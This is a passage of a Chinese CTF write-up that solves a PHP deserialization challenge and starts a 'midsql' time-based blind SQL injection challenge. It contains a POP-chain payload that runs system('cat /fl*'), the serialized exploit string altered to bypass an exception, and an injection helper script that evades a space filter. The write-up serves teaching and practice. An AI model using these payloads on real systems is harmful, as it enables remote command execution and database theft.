punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">obj</span><span class=\"token operator\">-></span><span class=\"token function\">evil</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">evil</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Reverse</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Web</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">evil</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Not Flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Crypto</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token variable\">$wel</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">obj</span><span class=\"token operator\">-></span><span class=\"token property\">good</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"NewStar\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Misc</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">evil</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"good job but nothing\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'fast'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Nope\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>Fatal error<span class=\"token punctuation\">:</span> Uncaught Exception<span class=\"token punctuation\">:</span> Nope in <span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html<span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span class=\"token punctuation\">:</span><span class=\"token number\">55</span> Stack trace<span class=\"token punctuation\">:</span> <span class=\"token comment\">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 55</span></span></pre></td></tr></table></figure><p>本题的 pop 链很简单：</p>\n<blockquote>\n<p>Start::__destruct -&gt; Crypto::__toString -&gt; Reverse::__get -&gt; Pwn::__invoke -&gt; Web::evil</p>\n</blockquote>\n<p>难点在于这个 throw new Exception (&quot;Nope&quot;);  抛出异常提前结束 destruct 函数，</p>\n<p>关于如何绕过可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvd0tXVnFpTXo4S0FZMERBc1BtSjF3QQ==\">php (phar) 反序列化漏洞及各种绕过姿势</span></p>\n<p>payload:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Start</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$errMsg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pwn</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Reverse</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Web</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$func</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'system'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"cat /fl*\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Crypto</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Misc</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">errMsg</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Crypto</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">errMsg</span> <span class=\"token operator\">-></span> <span class=\"token property\">obj</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Reverse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">errMsg</span> <span class=\"token operator\">-></span> <span class=\"token property\">obj</span> <span class=\"token operator\">-></span> <span class=\"token property\">func</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">errMsg</span> <span class=\"token operator\">-></span> <span class=\"token property\">obj</span> <span class=\"token operator\">-></span> <span class=\"token property\">func</span> <span class=\"token operator\">-></span> <span class=\"token property\">obj</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Web</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>得到：</p>\n<blockquote>\n<p>a:2:{i:0;O:5:&quot;Start&quot;:1:{s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:{s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:{s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:{s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:{s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:8:&quot;cat /fl*&quot;;}}}}}i:1;N;}</p>\n</blockquote>\n<p>把 i:1;N 改成 i:0;N，或者 i:0;O 给成 i:1;O</p>\n<blockquote>\n<p>a:2:{i:0;O:5:&quot;Start&quot;:1:{s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:{s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:{s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:{s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:{s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:8:&quot;cat /fl*&quot;;}}}}}i:0;N;}</p>\n</blockquote>\n<p>传参后得到 flag。</p>\n<h3 id=\"midsql\"><a class=\"anchor\" href=\"#midsql\">#</a> midsql</h3>\n<p>老朋友了，这次是：sql 时间盲注 + 过滤了空格</p>\n<p>测试输入框，发现过滤了空格，其他没有过滤，页面没有回显</p>\n<blockquote>\n<p>preg_match(&quot;/( |\\n|\\x0a)/is&quot;, $_REQUEST[&quot;id&quot;]) ||</p>\n<p>preg_match(&quot;/[=\\x09\\xa0\\x0a\\x0b\\x0c\\x0d\\x0e]/&quot;, $_REQUEST[&quot;id&quot;])</p>\n</blockquote>\n<p>使用 /**/ 即可进行时间盲注</p>\n<p>这里可以直接参考官方 wp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> copy</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Gadget</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__enter__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> self</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__exit__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> exc_type<span class=\"token punctuation\">,</span> exc_val<span class=\"token punctuation\">,</span> exc_tb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">str2hex</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> string<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        result <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> string<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            result <span class=\"token operator\">+=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">'0x'</span> <span class=\"token operator\">+</span> result<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'0x'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_char_ascii</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> string<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        method1 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'(Ord(right(left(</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>string<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">),1)))'</span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        method2 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'(Ord(substr(</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>string<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/**/from/**/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/**/for/**/1)))'</span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        method3 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'(Ord(sUbstr(</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>string<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> frOm </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> fOr 1)))'</span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">return</span> method2</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">table_name_in_db</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        s1 <span class=\"token operator\">=</span> <span class=\"token string\">'(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        s2 <span class=\"token operator\">=</span> <span class=\"token string\">'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        s3 <span class=\"token operator\">=</span> <span class=\"token string\">'(Select(group_coNcat(table_name))frOm(infOrmation_schema.tables)wHere((table_schema)In(dAtabase())))'</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">return</span> s3</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">table_name_in_db2</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> schema_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        s1 <span class=\"token operator\">=</span> <span class=\"token string\">'(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        s2 <span class=\"token operator\">=</span> <span class=\"token string\">'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        s3 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"(Select(group_coNcat(table_name))frOm(infOrmation_schema.tables)wHere((table_schema)In('</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>schema_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">')))\"</span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">return</span> s3</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">db_names</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        s1 <span class=\"token operator\">=</span> <span class=\"token string\">'(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        s2 <span class=\"token operator\">=</span> <span class=\"token string\">'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        s3 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"(sElect(group_coNcat(sChema_name))from(information_schema.schemata))\"</span></span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">return</span> s3</pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">column_name_in_table</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> table_name<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        s1 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"(select(group_concat(column_name))from(infOrmation_schema.columns)where(table_name)in('</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'))\"</span></span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        s2 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"(sElect(group_cOncat(Column_name))frOm(infOrmation_schema.cOlumns)wHere(table_name)In(</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>str2hex<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">))\"</span></span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">return</span> s2</pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">column_value_in_table</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> table_name<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> column_name<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        s1 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"(sElect(grOup_cOncat(</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>column_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">))frOm(</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">))\"</span></span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">return</span> s1</pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_len</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> function<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        s1 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'(lenGth(</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>function<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">))'</span></span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">return</span> s1</pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">ascii_equal</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> asc<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        s1 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"((</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>asc<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">)in(</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">))\"</span></span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">return</span> s1</pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">len_equal</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        s1 <span class=\"token operator\">=</span> <span class=\"token 